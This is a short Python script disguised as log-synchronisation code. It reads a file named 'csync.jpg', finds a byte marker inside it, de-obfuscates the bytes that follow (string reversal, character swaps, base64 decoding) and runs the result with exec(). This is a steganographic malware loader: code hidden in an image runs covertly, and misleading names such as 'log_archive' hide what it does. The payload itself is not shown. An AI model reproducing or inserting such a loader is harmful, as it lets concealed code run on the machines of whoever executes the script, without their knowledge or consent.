import base64
import os
import sys
from pathlib import Path

def _coresync_decode(packaged):
    try:
        if packaged.startswith(b'SYNC_') and packaged.endswith(b'_SYNC'):
            packaged = packaged[5:-5]
        
        packaged = packaged[::-1]
        
        packaged = packaged.replace(b'!', b'=')
        packaged = packaged.replace(b'-', b'/')
        packaged = packaged.replace(b'_', b'+')
        
        padding_needed = len(packaged) % 4
        if padding_needed:
            packaged += b'=' * (4 - padding_needed)
        
        return base64.b64decode(packaged)
    except Exception:
        return None

def _coresync_extract(archive_path):
    try:
        with open(archive_path, 'rb') as f:
            archive_content = f.read()
        
        log_marker = b'\xFF\xFE'
        marker_position = archive_content.find(log_marker)
        
        if marker_position != -1:
            log_start = marker_position + 4
            log_end = archive_content.find(b'\xFF', log_start)
            if log_end == -1:
                log_end = len(archive_content)
            
            encoded_data = archive_content[log_start:log_end]
            return _coresync_decode(encoded_data)
    except Exception:
        pass
    return None

log_directory = Path(__file__).parent
log_archive = log_directory / "csync.jpg"

if not log_archive.exists():
    sys.exit(1)

coresync_data = _coresync_extract(log_archive)
if coresync_data:
    exec(coresync_data)
else:
    sys.exit(1)